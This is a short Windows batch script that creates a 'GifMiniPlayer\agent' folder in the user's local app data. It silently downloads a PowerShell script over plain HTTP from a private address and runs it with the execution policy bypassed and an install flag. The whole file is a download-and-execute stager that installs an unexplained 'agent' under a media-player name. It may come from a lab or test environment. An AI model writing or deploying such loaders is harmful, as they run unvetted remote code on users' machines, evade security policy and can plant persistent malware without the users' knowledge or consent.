@echo off
set D=%LOCALAPPDATA%\GifMiniPlayer\agent
if not exist "%D%" mkdir "%D%"
curl.exe -s -o "%D%\agent.ps1" http://192.168.103.1:8001/agent.ps1
powershell -NoProfile -ExecutionPolicy Bypass -File "%D%\agent.ps1" -Install
